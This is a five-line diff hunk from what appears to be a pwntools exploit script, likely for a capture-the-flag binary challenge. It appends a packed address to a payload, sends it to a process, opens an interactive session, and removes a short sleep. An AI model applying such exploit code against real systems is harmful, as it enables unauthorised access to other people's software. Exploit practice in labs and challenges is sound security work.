@@ -17,5 +17,4 @@ payload += p32(int(addr,16))
 log.info("payload : " + payload)
 p.sendline(payload)
 
-sleep(0.5)
 p.interactive()
